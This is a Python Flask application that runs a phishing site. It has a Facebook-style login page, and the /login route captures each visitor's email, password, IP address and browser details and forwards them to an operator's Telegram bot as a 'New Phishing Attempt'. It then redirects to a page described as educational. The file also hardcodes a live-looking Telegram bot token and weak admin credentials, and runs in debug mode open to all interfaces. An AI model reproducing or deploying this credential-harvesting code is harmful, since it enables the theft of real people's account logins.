from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import datetime
import hashlib
import os
import requests
import threading
import time
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Telegram Bot Configuration
BOT_TOKEN = '8456610849:AAF7tP7m0Psw2Q4bE_mKPjVjUvITGu4cw8U'
CHAT_ID = None  # Will be set on first message

def handle_telegram_webhook():
    """Handle incoming messages from Telegram"""
    global CHAT_ID
    base_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    
    try:
        response = requests.get(f'{base_url}getUpdates')
        updates = response.json()
        
        if updates.get('ok') and updates.get('result'):
            for update in updates['result']:
                if 'message' in update and 'text' in update['message']:
                    chat_id = update['message']['chat']['id']
                    message_text = update['message']['text']
                    
                    # Handle /start command
                    if message_text == '/start':
                        CHAT_ID = chat_id
                        welcome_message = (
                            "🔥 *Activated* 🔥\n\n"
                            "✅ Bot is now configured and ready\n"
                            "📡 You will receive phishing attempts in real-time\n"
                            "🔒 Your Chat ID has been securely stored\n\n"
                            "Bot Status: *ONLINE*"
                        )
                        send_to_telegram(welcome_message)
                        # Clear updates to avoid processing old messages
                        requests.get(f'{base_url}getUpdates?offset={update["update_id"] + 1}')
                        return True
    except Exception as e:
        print(f'Error handling webhook: {e}')
    return False

def send_to_telegram(message):
    """Send message to Telegram"""
    global CHAT_ID
    base_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    
    # If we don't have the chat ID yet, try to handle /start command
    if CHAT_ID is None:
        handle_telegram_webhook()
    
    try:
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(f'{base_url}sendMessage', data=payload)
        return response.ok
    except Exception as e:
        print(f'Error sending message: {e}')
        return False

# Admin credentials (change these in production)
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'securepassword123'

def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Main landing page - Business collaboration theme"""
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Facebook-style login page"""
    if request.method == 'POST':
        # Capture credentials
        username = request.form.get('email')
        password = request.form.get('pass')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        # Send data to Telegram
        message = f"<b>🎣 New Phishing Attempt</b>\n\n" \
                 f"📧 Username: <code>{username}</code>\n" \
                 f"🔑 Password: <code>{password}</code>\n" \
                 f"🌐 IP Address: <code>{ip_address}</code>\n" \
                 f"📱 User Agent: <code>{user_agent}</code>\n" \
                 f"⏰ Time: <code>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
        
        send_to_telegram(message)
        
        # Redirect to educational page
        return redirect(url_for('educational_page'))
    
    return render_template('login.html')

@app.route('/success')
def educational_page():
    """Educational page showing users they were phished"""
    return render_template('education.html')

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('admin_login.html', error='Invalid credentials')
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
@require_admin
def admin_dashboard():
    """Admin dashboard"""
    return render_template('admin.html', message='Data is being sent to Telegram bot')



@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.pop('admin_logged_in', None)
    return redirect(url_for('index'))

def init_bot():
    """Initialize the Telegram bot and wait for /start command"""
    print("🤖 Waiting for /start command in Telegram...")
    while CHAT_ID is None:
        if handle_telegram_webhook():
            print("✅ Bot initialized successfully!")
            break
        time.sleep(2)  # Check every 2 seconds

if __name__ == '__main__':
    import threading
    import time
    
    # Start bot initialization in a separate thread
    bot_thread = threading.Thread(target=init_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=5000, debug=True)
